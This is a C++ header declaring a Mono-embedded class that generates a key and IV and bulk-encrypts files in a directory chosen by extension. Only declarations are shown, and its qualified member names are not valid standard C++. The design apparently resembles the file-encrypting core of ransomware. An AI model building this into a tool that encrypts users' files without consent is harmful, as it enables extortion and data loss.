#ifndef DE_H
#define DE_H

#include <mono/jit/jit.h>
#include <mono/metadata/assembly.h>
#include <mono/metadata/debug-helpers.h>
// VERY IMPORTANT TO INCLUDE mono-config (not included in documentation for some reason lol)
#include <mono/metadata/mono-config.h>

class DE {
    public:
        static void DE::Encryptor(MonoString* directory, MonoString* ext);
        static void DE::Update_key_iv(unsigned char* key, unsigned char* iv);
        static void DE::file_key_iv(char direct[100]);
        static MonoString* DE::Return_key_and_iv(MonoString* directory);

        static void DE::handleErrors(void);
        static void DE::Handle_Files(char input_files[100][100], char targeted_files[100][100], char directory[100], char extension[100]);
        static void DE::Generate_key_iv(unsigned char* key, unsigned char* iv);
        static void DE::Encrypt_Files(char targeted_files[100][100], char directory[100], unsigned char* key, unsigned char* iv);
        static void DE::Full_Encrypt(char input_files[100][100], char targeted_files[100][100], char directory[100], char extension[100], unsigned char* key, unsigned char* iv);

};

#endif
